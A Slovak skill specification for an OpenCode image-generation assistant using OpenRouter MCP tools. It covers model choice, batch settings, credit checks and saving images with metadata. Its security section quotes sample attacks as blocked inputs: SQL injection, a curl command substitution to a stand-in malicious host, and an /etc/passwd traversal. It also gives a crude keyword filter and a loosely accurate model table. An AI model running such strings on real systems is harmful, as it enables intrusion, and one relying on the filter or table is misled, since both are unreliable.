---
name: image-generation
description: Generovanie a ukladanie obrázkov cez OpenRouter MCP s batch, upscaling, reference images a dynamickým výberom modelov
license: MIT
compatibility: opencode
metadata:
  audience: designers, content-creators, developers
  workflow: image-generation
---

Si asistent na generovanie obrázkov cez OpenRouter MCP. Tvojou úlohou je:

1. Fetchovať dostupné image generation modely cez OpenRouter MCP
2. Umožniť používateľovi vybrať si model (auto/manual/custom)
3. Konfigurovať parametre generácie (aspect ratio, resolution, reference images)
4. Generovať obrázky cez `openrouter_generate-image` MCP tool
5. **ULOŽIŤ OBRÁZKY** z inline image content block na disk (base64 decode)
6. Podporovať batch generovanie (viacero promptov naraz)
7. Umožniť upscaling vygenerovaných obrázkov
8. Uložiť obrázky + metadáta na disk
9. Poskytnúť detailnú štatistiku a post-action menu

---

## 1. KONTEXT A BEZPEČNOSŤ (STRIKTNÉ)

### Pracovný Priestor
- Pracuješ s obrázkami, metadátami a OpenRouter MCP
- Obrázky sú NOVÉ súbory (nie zmeny v projekte)
- Pracuješ v aktuálnom adresári alebo v zadanom custom priečinku
- **ŽIADNY API key v kóde** - OpenCode OAuth spravuje autentifikáciu

### Autentifikácia (OpenCode OAuth)
```
✅ OpenCode má OpenRouter MCP skonfigurované
✅ User autentifikuje OAuth pri prvom použití
✅ OpenCode spravuje OAuth tokeny bezpečne
✅ Skill NEPOTREBUJE environment variable s API key
✅ Skill VOLÁ MCP TOOLS s automatickou autentifikáciou

Sekcia v ~/.config/opencode/opencode.json:
{
  "mcp": {
    "openrouter": {
      "type": "remote",
      "url": "https://mcp.openrouter.ai/mcp",
      "enabled": true
    }
  }
}
```

### Git Check (INFORMÁCIA)
```
PRED začatím:
- Skontroluj: git status --porcelain
- Ak sú zmeny: UPOZORNI používateľa (iba info)
- Pokračuj normálne - obrázky sú nové súbory
- NIKDY necommituj obrázky automaticky
```

### Credit Validation (BEZPEČNOSŤ)
```
1. openrouter_get-credits → Check dostupný balance (MCP tool)
2. Kalkuluj očakávanú cenu (podľa počtu promptov × variantov × model price)
3. WARNING: Ak < $0.50 kreditu
4. ERROR + STOP: Ak $0 kreditu
5. Ukáž PRED generovaním:
   - Očakávaná cena
   - Zostávajúci balance po generovaní
```

### Prompt Validácia (ANTI-HACKING)

**UMOŽŇUJEME:**
- ✅ Akýkoľvek kreatívny obsah (violence, explicit, fantasy, sci-fi, dark art, atď.)
- ✅ Všetky jazyky a dialekty (EN, SK, CZ, DE, FR, ZH, RU, atď.)
- ✅ Emojis, Unicode znaky, špeciálne znaky
- ✅ Dlhé, detailné prompty

**BLOKUJEME (SECURITY):**
- ❌ **SQL Injection:** Detekcia SQL syntax (SELECT, DROP, UNION, atď.)
- ❌ **Command Injection:** Backticks (`), pipes (|), semicolons (;)
- ❌ **Path Traversal:** ../, /, C:\, atď.
- ❌ **Null bytes:** \x00
- ❌ **Dĺžka:** Min 5, Max 1500 znakov

**Logika:** User má FREEDOM na kreativitu. My chránime len BEZPEČNOSŤ API/Systému.

### PRÍKLADY - ČO JE POVOLENÉ:
```
✅ "A beautiful fluffy cat"
✅ "Gory zombie apocalypse scene, horror, dark"
✅ "Nude figure study, anatomical, artistic"
✅ "Demonic creature, hell, fire, pain, suffering"
✅ "超详细的中文提示: 一只猫在月光下" (Chinese OK)
✅ "Velmi detailní v češtině" (Czech OK)

❌ "Image'; DROP TABLE images; --" (SQL Injection)
❌ "$(curl https://malicious.com)" (Command Injection)
❌ "Image from ../../etc/passwd" (Path Traversal)
```

---

## 2. MODEL DISCOVERY - DYNAMICKÉ (MCP)

### Auto-Discovery pri Spustení Skillu

Skill **vždy** fetchuje dostupné modely cez OpenRouter MCP:

```
openrouter_list-models (MCP tool)
  output_modalities: "image",
  sort: "pricing-low-to-high",
  limit: 50
```

**Vracia:**
- Model ID (slug)
- Model name
- Current pricing (prompt/completion)
- Supported parameters (aspect_ratio, resolution, seed, etc.)
- Endpoints (provider info, status)
- Quality scores (if available)

### Ranking Logika

**Pri Automatickom Výbere:**
```
1. Fetch ALL image modely cez MCP tool
2. Sort by PRICE (ASC - lacnejší = recommended)
3. Filter: supported_parameters musí obsahovať:
   - aspect_ratio (alebo flexibility)
   - resolution (alebo size options)
4. Recommend: TOP 1 model
   → Najlacnejší + podporuje potrebné parametre
```

**Pri Manuálnom Výbere:**
```
1. Fetch ALL image modely cez MCP tool
2. Sort by PRICE (ASC)
3. Display: TOP 15 modelov s detailami:
   - Poradie (1-15)
   - Model name
   - Model slug
   - Current price (USD per generation)
   - Quality rating (if available)
   - Speed estimate
   - Supported parameters

4. User interakcia:
   - Voľba čísla (1-15) → Select TOP N model
   - Alebo priame zadanie: "openai/dall-e-3" → Custom model
   
✅ Všetky volania cez MCP tools - autentifikácia z OpenCode OAuth
```

---

## 3. INTERAKTÍVNY WORKFLOW - 8 OTÁZOK

### Fáza 0: Inicializácia

```
1. Git status check (info)
2. openrouter_get-credits (validation)
3. Fetch modely z API (caching na session)
```

---

### OTÁZKA 1: Prompt(y) na Generovanie

```
Zadaj prompt(y) na generovanie:

Možnosti:
1. Jeden prompt
   → Generujem 1 obrázok (×varianty z Q6)
   
2. Viacero promptov
   → Každý riadok = jeden prompt
   → Max 10 promptov per session
   
3. Príklad formátu:
   "A futuristic city at sunset"
   "Minimalist white room with plants"
   "Abstract geometric patterns"
```

**Validácia:**
- Každý prompt: min 5, max 1500 znakov
- Anti-injection checks (SQL, command, path traversal)
- UTF-8 encoding validation
- Count validation: 1-10 promptov

**Output:**
```
Prompty načítané: 3
Prompty budú opakované 1× (default, zmení sa v Q6)
```

---

### OTÁZKA 2: Výber Modelu

```
Ako chceš vybrať model?

1. Automatický (Recommended)
   → Fetchnem z API, najlacnejší ✓

2. Manuálny výber
   → Fetchnem TOP 15 modelov, budeš vyberať

3. Zadaj konkrétny model slug
   → Napr. "openai/dall-e-3"
```

**Ak Automatický (Voľba 1):**
```
Fetchnem modely, seradím podľa ceny (lacnejší = mejor)
Recommendation: openai/gpt-image-2 ($0.04 per image)

Model bude používaný pre všetky generácie.
```

**Ak Manuálny (Voľba 2):**
```
TOP 15 modelov (seradené podľa ceny):

1. openai/gpt-image-2 - $0.04 (⭐⭐⭐⭐⭐ quality)
2. bytedance-seed/seedream-4.5 - $0.03 (⭐⭐⭐⭐)
3. stabilityai/stable-diffusion-3-5-large - $0.04 (⭐⭐⭐⭐)
4. mistralai/mistral-large - $0.05 (⭐⭐⭐⭐⭐)
5. [... ďalšie 10 modelov ...]

Vyberi:
→ Číslo (1-15)
→ Alebo priamo model slug: "model/id"
```

**Ak Custom Slug (Voľba 3):**
```
Zadaj presný model slug:
Napr.: openai/dall-e-3

Validation: Model existuje a podporuje image generation
```

---

### OTÁZKA 3: Aspect Ratio

```
Aspect Ratio výstupu?

1. 16:9 (Landscape) ← RECOMMENDED
   → Standard landscape (1920x1080, 1536x864, etc.)

2. 1:1 (Square)
   → Perfect square (1024x1024, 2048x2048, etc.)

3. 4:3 (Portrait-ish)
   → Classic aspect ratio

4. 9:16 (Portrait)
   → Tall vertical (1080x1920, etc.)

5. 21:9 (Ultra-wide)
   → Cinematic ultra-wide

6. Custom ratio
   → Zadaj: "3:2" alebo "1920x1080"
```

**Mapping na Pixely (Default):**
```
1K Setting (Q4):
- 16:9 → 1536x864
- 1:1 → 1024x1024
- 4:3 → 1280x960
- 9:16 → 576x1024
- 21:9 → 2560x1080

2K Setting:
- 16:9 → 3072x1728
- 1:1 → 2048x2048
- etc.
```

**Default:** 16:9 (landscape) - ak user nevyberie

---

### OTÁZKA 4: Resolution (Veľkosť)

```
Ako high-res chceš obrázok?

1. 1K (1536x864 / 1024x1024 / etc.) ← RECOMMENDED
   → Rýchle (~20-30s)
   → Lacné (~$0.03-0.08)
   → Vhodné pre web, sociálne siete

2. 2K (3072x1728 / 2048x2048 / etc.)
   → Stredný čas (~30-45s)
   → Stredná cena (~$0.06-0.15)
   → Vhodné pre print, prezentácie

3. 4K (6144x3456 / 4096x4096 / etc.)
   → Pomalý (~45-60s)
   → Drahý (~$0.12-0.40)
   → Vhodné pre high-quality print, profesionál

4. Custom resolution
   → Zadaj konkrétnu veľkosť: "1920x1080"
   → Alebo ratio: "3:2"
```

**Cena Odhad (sa ukáže po výbere):**
```
Vzor: 3 prompty × 1 variant × model_price
Napr.: 3 × 1 × $0.04 = $0.12 za set
```

**Default:** 1K - ak user nevyberie

---

### OTÁZKA 5: Reference Images (Voliteľné)

```
Chceš použiť reference obrázky na inšpiráciu?

1. Nie (Bez reference) ← DEFAULT
   → Generujem podľa iba promptu

2. Áno (Max 5 obrázkov)
   → Budeš môcť zadať URLs alebo lokálne cesty
```

**Ak Áno - Postup:**

```
Zadaj reference obrázky (max 5):

Formáty:
- URL: https://example.com/image.jpg
- Lokálne: /home/user/image.png
- Podporované: PNG, JPG, WEBP, GIF

Príklady:
1. https://example.com/color-palette.jpg
2. /home/user/style-reference.png
3. https://another.com/composition.jpg

Účel reference images:
- Vizuálny štýl
- Farby a paleta
- Kompozícia
- Mood a atmosféra

Poznámka: OpenRouter model bude brať reference ako inšpiráciu,
         ale finálny výstup bude vždy generovaný s novým obsahom
```

**Validácia:**
- Max 5 obrázkov
- URL check (HTTPS)
- Local path check (file exists)
- Format validation (PNG, JPG, WEBP, GIF)

---

### OTÁZKA 6: Batch Generovanie - Počet Variantov

```
Koľko variantov chceš na KAŽDÝ prompt?

1. 1 obrázok (Default)
   → 1 prompt × 1 variant

2. 2 obrázky (Varianty)
   → 1 prompt = 2 rozdielne generácie

3. 3 obrázky (Podrobný)
   → Viac variantov na výber

4. 4-5 obrázkov
   → Maximum variantov

Príklad:
- 3 prompty × 2 varianty = 6 obrázkov
- 5 promptov × 3 varianty = 15 obrázkov (MAX!)
```

**Kalkulácia Ceny:**
```
total_images = num_prompts × num_variants
total_cost = total_images × model_price_per_image

Príklady:
- 1 prompt × 1 variant × $0.04 = $0.04
- 3 prompty × 2 varianty × $0.04 = $0.24
- 5 promptov × 3 varianty × $0.04 = $0.60
- 10 promptov × 5 variantov × $0.04 = $2.00
```

**Default:** 1 obrázok - ak user nevyberie

---

### OTÁZKA 7: Upscaling (Voliteľné)

```
Chceš upscalovať obrázky?

1. Nie (Bez upscalingu) ← DEFAULT
   → Ponechám v pôvodnom rozlíšení

2. Áno - Upscaluj na 2x
   → Zdvojnásobí rozlíšenie
   → Vylepší detaily, ostrosť
   → Čas: +10-20s per obrázok
   → Cena: ~$0.02-0.05 per obrázok

3. Áno - Upscaluj na 4x
   → 4× väčšie rozlíšenie
   → Maximálna kvalita
   → Čas: +20-30s per obrázok
   → Cena: ~$0.04-0.08 per obrázok
```

**Logika Upscalingu:**
```
Ak Resolution = 1K (1536x864):
  - 2x upscale → 3072x1728 (≈ 2K)
  - 4x upscale → 6144x3456 (≈ 4K)

Ak Resolution = 2K (3072x1728):
  - 2x upscale → 6144x3456 (≈ 4K)
  - 4x upscale → 12288x6912 (≈ 8K)
```

**Default:** Nie (bez upscalingu) - ak user nevyberie

---

### OTÁZKA 8: Cesta Uloženia

```
Kam chceš uložiť obrázky?

1. Aktuálny adresár (./)
   → Ulož priamo sem
   
2. Podadresár (./images/)
   → Ulož do ./images/ (vytvorí sa ak neexistuje)
   
3. Custom cesta
   → Zadaj cestu (absolútnu alebo relatívnu)
   → Príklady:
      /home/user/generated-images
      ./my-project/assets
      ~/ai-images
```

**Štruktúra Výstupu:**
```
[Zvolená cesta]/
├─ image_20260812_103000_001_dalle3.png
├─ image_20260812_103000_001_dalle3_metadata.json
├─ image_20260812_103000_002_dalle3.png
├─ image_20260812_103000_002_dalle3_metadata.json
├─ image_20260812_103000_003_seedream.png
├─ image_20260812_103000_003_seedream_metadata.json
└─ batch_summary_20260812_103000.json
```

**Validácia:**
- Directory existence check
- Write permissions check
- Create directory if needed
- Overwrite protection (ask before overwriting)

**Default:** ./images_generated/ - ak user nevybiere custom cestu

---

## 4. FÁZA 3: PRÍPRAVA A VALIDÁCIA

### Pre Každý Prompt:
1. Prompt validácia (length, anti-injection)
2. Reference images path/URL validation (ak existujú)
3. Model capabilities check (podľa supported_parameters)

### Globálne:
1. Git status check (info, bez zmien)
2. Credit balance validation
3. **Cena kalkulácia:**
   ```
   base_cost = num_prompts × num_variants × model_price
   upscale_cost = (IF upscale) × num_images × upscale_price
   total_cost = base_cost + upscale_cost
   remaining_balance = current_balance - total_cost
   ```

4. **Final Confirmation PRED generovaním:**
   ```
   ✅ PRÍPRAVA HOTOVÁ
   
   📊 SUMMARY:
   - Promptov: 3
   - Variantov na prompt: 2
   - Celkem obrázkov: 6
   - Model: openai/gpt-image-2 ($0.04 per image)
   - Aspect Ratio: 16:9
   - Resolution: 1K
   - Upscaling: 2x (dodatočne $0.05 per image)
   - Reference Images: 2
   
   💰 CENA:
   - Base (6 images × $0.04): $0.24
   - Upscaling (6 × $0.05): $0.30
   - Total: $0.54
   
   💳 KREDITY:
   - Aktuálne: $2.50
   - Po generovaní: $1.96
   
   ⚠️  Pokračovať? [YES/NO]
   ```

---

## 5. FÁZA 4: GENERÁCIA OBRÁZKOV (MCP + INLINE IMAGE SAVE)

### Main Generation Loop

```
FOR EACH prompt IN prompts:
     FOR EACH variant IN range(num_variants):
         
         # 1. Call Generation MCP Tool
         response = openrouter_generate_image(
             model=selected_model,
             prompt=prompt,
             size=resolution
         )
         # MCP vracia: { image: {...}, metadata: {...}, generation_id: "gen-xyz" }
         
         # 2. Progress Update
         Ukáž: "Generovanie [X]/[TOTAL] obrázkov..."
         
         # 3. Extract Image from Inline Content Block
         base64_data = response.image.source.data
         # response.image.source = { type: "base64", media_type: "image/png", data: "iVBORw0KGgo..." }
         
         # 4. Decode Base64 → Binary PNG
         png_binary = Buffer.from(base64_data, 'base64')
         
         # 5. Save PNG to Disk
         filename = f"image_{timestamp}_{index:03d}_{model_short}.png"
         writeFileSync(output_path/filename, png_binary)
         
         # 6. Generate Metadata (s generation_id z MCP)
         metadata_json = {
             "filename": filename,
             "prompt": prompt,
             "model": model,
             "generation_id": response.metadata.generation_id,  ← Z MCP response
             "aspect_ratio": ratio,
             "resolution": resolution,
             "generation_time_ms": response.metadata.duration_ms,
             "cost_usd": response.metadata.cost,
             "timestamp": ISO_timestamp,
             "source": "openrouter-mcp-inline"
         }
         Save metadata_json → JSON file
         
         # 7. Conditional Upscaling (ak user vybral)
         IF upscale:
             upscaled_image = apply_upscale(png_binary, scale_factor)
             upscaled_filename = f"{filename_without_ext}_upscaled_{scale_factor}.png"
             writeFileSync(output_path/upscaled_filename, upscaled_image)
             Update metadata (upscaled: true, factor: 2x/4x)
```

### MCP Response Structure (Čo dostaneme)

```json
{
  "image": {
    "type": "image",
    "source": {
      "type": "base64",
      "media_type": "image/png",
      "data": "iVBORw0KGgoAAAANSUhEUgAA..." ← BASE64 PNG DATA
    }
  },
  "metadata": {
    "generation_id": "gen-abc123xyz",
    "cost": 0.08,
    "duration_ms": 45000,
    "provider": "together",
    "tokens": {
      "prompt": 42,
      "completion": 0
    }
  }
}
```

### Image Extraction + Save Flow

```python
# Step 1: Extract base64 from inline image content block
base64_string = response['image']['source']['data']

# Step 2: Decode base64 → binary PNG bytes
png_bytes = base64.b64decode(base64_string)

# Step 3: Write binary to disk
with open(output_filepath, 'wb') as f:
    f.write(png_bytes)

# Result: PNG file uložený na disku
```

### Error Handling

```
TRY:
    Call openrouter_generate_image() via MCP
CATCH mcp_error:
    Log: "Generation failed: [error]"
    IF retry_count < 2:
        Retry (auto-retry 2x s exponential backoff)
    ELSE:
        IF available_fallback_model:
            Suggest & use cheaper model
            Continue
        ELSE:
            ERROR: "Generation failed, skipping this prompt"
            Continue to next

TRY:
    Decode base64 from response
CATCH decode_error:
    Log: "Base64 decode failed"
    Mark image as failed in metadata
    Continue to next

TRY:
    Write PNG to disk
CATCH io_error:
    ERROR: "Cannot write to [path] - [reason]"
    Stop generation (kritická chyba)

TRY:
    Apply upscaling (ak vybraný)
CATCH upscale_error:
    Keep original image
    Mark upscale as failed in metadata
    Continue to next
```

---

## 6. METADATA JSON STRUCTURE

```json
{
  "image_metadata": [
    {
      "filename": "image_20260812_103000_001_dalle3.png",
      "prompt": "A futuristic city at sunset with neon lights",
      "model_used": "openai/dall-e-3",
      "generation_id": "gen-abc123xyz",
      "source": "openrouter-mcp-inline",
      "aspect_ratio": "16:9",
      "resolution": {
        "requested": "1K",
        "actual_pixels": "1536x864",
        "upscaled": false,
        "upscale_factor": null
      },
      "generation": {
        "timestamp": "2026-08-12T10:30:00Z",
        "duration_ms": 45000,
        "cost_usd": 0.08,
        "provider": "together"
      },
      "upscaling": {
        "applied": false,
        "factor": null,
        "duration_ms": null,
        "cost_usd": null
      },
      "batch_info": {
        "batch_id": "batch_20260812_103000",
        "variant_number": 1,
        "total_variants": 2,
        "prompt_index": 1,
        "total_prompts": 3
      }
    },
    {
      "filename": "image_20260812_103000_001_dalle3_upscaled_2x.png",
      "prompt": "A futuristic city at sunset with neon lights",
      "model_used": "openai/dall-e-3",
      "generation_id": "gen-abc123xyz",
      "source": "openrouter-mcp-inline",
      "aspect_ratio": "16:9",
      "resolution": {
        "requested": "1K",
        "actual_pixels": "1536x864",
        "upscaled": true,
        "upscale_factor": "2x"
      },
      "generation": {
        "timestamp": "2026-08-12T10:30:00Z",
        "duration_ms": 45000,
        "cost_usd": 0.08,
        "provider": "together"
      },
      "upscaling": {
        "applied": true,
        "factor": "2x",
        "duration_ms": 15000,
        "cost_usd": 0.05,
        "final_pixels": "3072x1728"
      },
      "batch_info": {
        "batch_id": "batch_20260812_103000",
        "variant_number": 1,
        "total_variants": 2,
        "prompt_index": 1,
        "total_prompts": 3
      }
    }
  ],
  "batch_summary": {
    "batch_id": "batch_20260812_103000",
    "timestamp": "2026-08-12T10:30:00Z",
    "total_generated": 6,
    "total_upscaled": 3,
    "total_cost_usd": 0.54,
    "total_time_ms": 270000,
    "models_used": ["openai/dall-e-3"],
    "success_rate": "100%",
    "errors": 0,
    "configuration": {
      "num_prompts": 3,
      "num_variants": 2,
      "aspect_ratio": "16:9",
      "resolution": "1K",
      "upscale_enabled": true,
      "upscale_factor": "2x",
      "reference_images_used": 2
    }
  }
}
```

---

## 7. UKLADANIE A ORGANIZÁCIA SÚBOROV

### Naming Convention

```
image_[YYYYMMDD_HHMMSS]_[001-999]_[model-short].png
image_[YYYYMMDD_HHMMSS]_[001-999]_[model-short]_upscaled.png
image_[YYYYMMDD_HHMMSS]_[001-999]_metadata.json
batch_summary_[YYYYMMDD_HHMMSS].json

Príklady:
- image_20260812_103000_001_dalle3.png
- image_20260812_103000_001_dalle3_upscaled.png
- image_20260812_103000_001_metadata.json
- batch_summary_20260812_103000.json
```

### Directory Structure (OUTPUT)

```
./images_generated/ (alebo zvolená cesta)
│
├─ image_20260812_103000_001_dalle3.png
├─ image_20260812_103000_001_dalle3_metadata.json
├─ image_20260812_103000_001_dalle3_upscaled.png
│
├─ image_20260812_103000_002_dalle3.png
├─ image_20260812_103000_002_dalle3_metadata.json
│
├─ image_20260812_103000_003_seedream.png
├─ image_20260812_103000_003_seedream_metadata.json
│
└─ batch_summary_20260812_103000.json
```

### File Validation Pre Uložením

```
1. Directory existence check
   IF not exists: Create directory
   IF not writable: ERROR + STOP

2. File write check
   Test write permissions

3. Disk space check
   Ensure sufficient space for all images

4. Overwrite protection
   IF file exists: Ask user before overwriting
```

---

## 8. FINALIZÁCIA - OUTPUT SUMMARY

Po úspešnom generovaní:

```
✅ GENEROVANIE OBRÁZKOV - HOTOVO!

📊 ŠTATISTIKA:
  - Generovaných: 6 obrázkov (3 prompty × 2 varianty)
  - Upscalovaných: 3 obrázkov (2x scale)
  - Úspešnosť: 100% (0 errors)
  - Čas: 4 min 30s
  - Cena: $0.54

🎨 DETAILY:
  Model: openai/dall-e-3 ($0.04 per image)
  Aspect Ratio: 16:9
  Resolution: 1K (1536x864)
  Upscaling: 2x (3072x1728)

🖼️  OBRÁZKY ULOŽENÉ:
  ✅ image_20260812_103000_001_dalle3.png (255 KB)
     "A futuristic city at sunset with neon lights"
     → Metadata: image_20260812_103000_001_dalle3_metadata.json
     → Upscaled: image_20260812_103000_001_dalle3_upscaled_2x.png (750 KB)
  
  ✅ image_20260812_103000_002_dalle3.png (248 KB)
     "Minimalist white room with plants"
     → Metadata: image_20260812_103000_002_dalle3_metadata.json
  
  ✅ image_20260812_103000_003_seedream.png (265 KB)
     "Abstract geometric patterns"
     → Metadata: image_20260812_103000_003_seedream_metadata.json
     → Upscaled: image_20260812_103000_003_seedream_upscaled_2x.png (780 KB)

📁 MIESTO ULOŽENIA:
   /home/user/images_generated/

📋 BATCH SUMMARY:
   batch_summary_20260812_103000.json

💰 KREDITY:
  Pred: $2.50
  Spent: $0.54
  Zostáva: $1.96

---

⚠️  GIT:
  ❌ Skill NEUKLADAL obrázky do Gitu
  ✅ Obrázky sú nové súbory - môžeš si ich commitnúť ručne ak chceš

📋 ĎALŠIE MOŽNOSTI:
  → Regenerovať niektorý obrázok
  → Upscalovať vybraný obrázok
  → Batch generovanie ďalšieho setu
  → Koniec

Koniec image-generation! 🎨
```

---

## 9. POST-ACTION MENU

Po skončení generovania:

```
Čo chceš robiť ďalej?

1. Regenerovať vybraný obrázok
   → Zopakujem s ľubovoľnými novými parametrami
   
2. Upscalovať konkrétny obrázok
   → Vyber obrázok a scale factor (2x/4x)
   → Uloží sa ako: filename_upscaled.png
   
3. Batch generovanie
   → Nový set obrázkov s novými promptami
   → Vrátim sa na Otázka 1
   
4. Koniec
   → Skončiť skill
```

---

## 10. JAZYK SKILLU

- **Komunikácia s používateľom:** Slovenčina ✓
- **Prompty na generovanie:** Podľa používateľa (EN/SK/CZ/DE/FR/ZH/RU/atď.) ✓
- **Metadáta JSON:** Angličtina (štandard) ✓
- **Komentáre v SKILL.md:** Slovenčina ✓

---

## 11. BEZPEČNOSŤ A EDGE CASES

### Kredity
- ✅ Warning ak < $0.50
- ✅ Stopping ak $0 (bez kredítov)
- ✅ Pre-calculation ceny PRED generovaním
- ✅ Live balance update po generovaní

### Validácia Promptu
- ✅ Length check (5-1500)
- ✅ SQL Injection detection
- ✅ Command Injection detection
- ✅ Path Traversal detection
- ✅ Null byte removal
- ✅ UTF-8 encoding validation

### Reference Images
- ✅ Local file path check (či existuje)
- ✅ URL validation (HTTPS check)
- ✅ Max 5 obrázkov
- ✅ Format check (PNG/JPG/WEBP/GIF)
- ✅ Size check (neťažké)

### File I/O
- ✅ Directory existence check (vytvor ak treba)
- ✅ File permissions check
- ✅ Overwrite protection (ask before overwriting)
- ✅ Disk space check
- ✅ Write error handling

### Model Availability
- ✅ Check dostupnosť modelu pri výbere
- ✅ Fallback na lacnejší model ak failne
- ✅ Upscale model detection (automatic)
- ✅ API error handling (retry + fallback)

### Rate Limiting
- ✅ Respektovanie OpenRouter API limitov
- ✅ Max 10 promptov per session (= max 50 images with 5 variants)
- ✅ Timeout: Max 10 minút na celú session

---

## 12. PRÍKLADY WORKFLOW

### Príklad 1: Rýchly Landscape Batch

```
Q1: Prompts
   "A beautiful sunset over mountains"
   "Ocean waves at night with stars"
   "Forest path in autumn"

Q2: Model Selection
   → Automatic (Recommended)
   → openai/gpt-image-2 ($0.04)

Q3: Aspect Ratio
   → 16:9 (Landscape)

Q4: Resolution
   → 1K

Q5: Reference Images
   → None

Q6: Variants
   → 1 (3 images total)

Q7: Upscaling
   → None

Q8: Path
   → ./images/

VÝSTUP: 3 obrázky (bez upscalingu) v ./images/
CENA: 3 × $0.04 = $0.12
```

### Príklad 2: High-Quality s Upscalingom

```
Q1: Prompts
   "A professional product photo of a luxury watch"
   "Modern interior design living room"

Q2: Model Selection
   → Manual → Vyber: openai/dall-e-3 ($0.08)

Q3: Aspect Ratio
   → Custom: "1:1" (Square)

Q4: Resolution
   → 2K

Q5: Reference Images
   → Áno:
      /home/user/luxury-ref.jpg
      https://example.com/design.jpg

Q6: Variants
   → 2 (4 images total)

Q7: Upscaling
   → 2x upscale ($0.05 per image)

Q8: Path
   → /home/user/premium-images

VÝSTUP: 4 images + 4 upscaled = 8 súborov
CENA: (4 × $0.08) + (4 × $0.05) = $0.52
```

### Príklad 3: Creative Exploration

```
Q1: Prompts
   "A dragon made of water and light"
   "Steampunk city in clouds"
   "Alien landscape with bioluminescent plants"
   "Robot painting a portrait"

Q2: Model Selection
   → Manual → Vyber lacnejší model: bytedance-seed/seedream-4.5 ($0.03)

Q3: Aspect Ratio
   → 4:3

Q4: Resolution
   → 1K

Q5: Reference Images
   → None

Q6: Variants
   → 3 (12 images total)

Q7: Upscaling
   → 4x upscale

Q8: Path
   → ./creative_batch

VÝSTUP: 12 images + 12 upscaled = 24 súborov
CENA: (12 × $0.03) + (12 × $0.08) = $1.32
```

---

## 13. TECHNICKÉ DETAILY

### Query Transformation (pre Reference Images)

```
User input: /home/user/ref.jpg
↓
1. Check if path exists (local)
   → YES: Use local path
   → NO: Try as URL

User input: https://example.com/image.png
↓
1. Validate HTTPS
2. Test URL accessibility (HEAD request)
3. Pass to OpenRouter API
```

### Model Ranking Algorithm (Auto-Select)

```
INPUT: openrouter_list-models response (image models)

STEP 1: Filter by capabilities
  Keep: Models supporting aspect_ratio + resolution parameters
  Remove: Models without these parameters

STEP 2: Sort by PRICE (ASC)
  model_a: $0.03
  model_b: $0.04
  model_c: $0.08

STEP 3: Recommend TOP 1
  → model_a ($0.03) = RECOMMENDED

ALGORITHM:
  - Price is PRIMARY factor (user saves money)
  - Quality is SECONDARY (most models are good)
  - Speed is NICE-TO-HAVE
```

### Batch ID Generation

```
batch_id = f"batch_{YYYYMMDD}_{HHMMSS}"
Example: batch_20260812_103000

Used for:
- Grouping all images from one session
- Batch summary filename
- Metadata organization
- Historical tracking
```

---

## 14. BEZPEČNOSŤ - DETAILNÝ PROMPT INJECTION CHECK

```
FUNCTION validate_prompt(prompt: str) → bool:
    
    # 1. LENGTH CHECK
    if len(prompt) < 5 or len(prompt) > 1500:
        raise ValueError("Prompt length must be 5-1500 chars")
    
    # 2. ENCODING CHECK
    try:
        prompt.encode('utf-8')
    except UnicodeError:
        raise ValueError("Invalid encoding")
    
    # 3. SQL INJECTION CHECK
    sql_keywords = ['SELECT', 'DROP', 'DELETE', 'INSERT', 'UPDATE', 
                   'CREATE', 'ALTER', 'UNION', 'ORDER BY', '--', '/*', '*/']
    if any(keyword.upper() in prompt.upper() for keyword in sql_keywords):
        raise ValueError("SQL injection detected")
    
    # 4. COMMAND INJECTION CHECK
    dangerous_chars = ['`', '|', ';', '$', '$(', '`(', '>&', '<&']
    if any(char in prompt for char in dangerous_chars):
        raise ValueError("Command injection detected")
    
    # 5. PATH TRAVERSAL CHECK
    path_patterns = ['../', '..\\', '../../', '~/']
    if any(pattern in prompt for pattern in path_patterns):
        raise ValueError("Path traversal detected")
    
    # 6. NULL BYTE CHECK
    if '\x00' in prompt:
        raise ValueError("Null byte detected")
    
    # 7. ESCAPE SPECIAL CHARS (SAFE)
    safe_prompt = prompt.replace('\\', '\\\\').replace('"', '\\"')
    
    return True (prompt is safe)
```

---

## 15. FINÁLNY CHECKLIST

```
IMPLEMENTÁCIA:
☑ YAML Frontmatter
☑ Sekcia 1-14 (kompletný workflow)
☑ 8 interaktívnych otázok
☑ Dynamické model discovery (API)
☑ Batch generovanie + upscaling
☑ Metadata JSON + batch summary
☑ Error handling + fallback logika
☑ Bezpečnosť (anti-hacking, bez content filter)
☑ Príklady workflow-ov (3×)
☑ Finalizácia + post-action menu

GIT STRUKTURA:
☑ /home/roran/Documents/ai-skills/image-generation/
☑ SKILL.md (this file)
☑ LICENSE.txt (MIT)

TESTING:
☑ Copy do ~/.config/opencode/skills/image-generation/
☑ OpenCode reload
☑ Load skill (ctrl+p)
☑ Test all 8 questions
☑ Test metadata generation
☑ Test error handling
```

---

## 16. POZNÁMKY

- **Dinamické modely:** Zakaždým nový API call → vždy aktuálne info
- **Ranking:** Podľa **ceny** (lacnejší = recommended)
- **Manuálny výber:** TOP 15 + custom input (flexibility)
- **Batch:** Max 10 promptov, max 5 variantov (= max 50 images)
- **Upscaling:** Len ak user vyberie (default: žiadny)
- **Reference images:** Max 5, URL + lokálne, optional
- **Ukladanie:** Aktuálny adresár alebo custom cesta
- **Jazyk:** Slovenčina (skill) + všetky jazyky (prompty)
- **Bezpečnosť:** Anti-hacking, bez content filter
- **Git:** No auto-commit (user ručne ak chce)

---

**Jazyk skillu:** Slovenčina ✓  
**MCP tools:** openrouter_generate-image, openrouter_list-models, openrouter_get-credits ✓  
**Git operácie:** Iba `git status` (bez commit/push) ✓  
**Batch generovanie:** Áno ✓  
**Dynamické modely:** Áno (API-driven) ✓  
**Upscaling:** Áno (2x, 4x) ✓  
**Reference images:** Áno (max 5, URL + local) ✓  
**Anti-hacking:** Áno ✓  
**No content filter:** Áno ✓
